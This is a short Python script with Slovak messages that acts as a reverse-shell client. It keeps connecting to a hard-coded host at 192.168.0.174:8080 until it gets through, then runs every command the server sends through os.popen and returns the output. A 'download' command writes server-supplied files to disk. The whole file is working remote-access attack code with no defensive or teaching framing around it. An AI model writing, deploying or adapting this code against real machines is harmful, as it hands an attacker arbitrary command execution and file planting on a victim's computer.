import socket
import os

def clear_screen():
    os.system("cls" if os.name == "nt" else "clear")

def receive_file(client_socket, file_name):
    try:
        with open(file_name, "wb") as file:
            while True:
                data = client_socket.recv(1024)
                if not data:
                    break
                file.write(data)
        print("File received successfully")
    except Exception as e:
        print("Error receiving file:", e)

server_ip = '192.168.0.174' 
server_port = 8080  

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

while True:
    try:
        s.connect((server_ip, server_port))
        print("Pripojenie na server úspešné. Čakám na príkazy od servera...")
        break
    except ConnectionRefusedError:
        print("Pripojenie na server neúspešné. Skúšam znova...")
        continue

while True:
    command = s.recv(1024).decode()

    if not command:
        break

    if command == "exit":
        break

    if command == "clear":
        clear_screen()

    if command.startswith("download "):
        file_name = command.split(" ")[1]
        receive_file(s, file_name)
    else:
        response = os.popen(command).read()
        s.send(response.encode())

print("Disconnected.")
s.close()
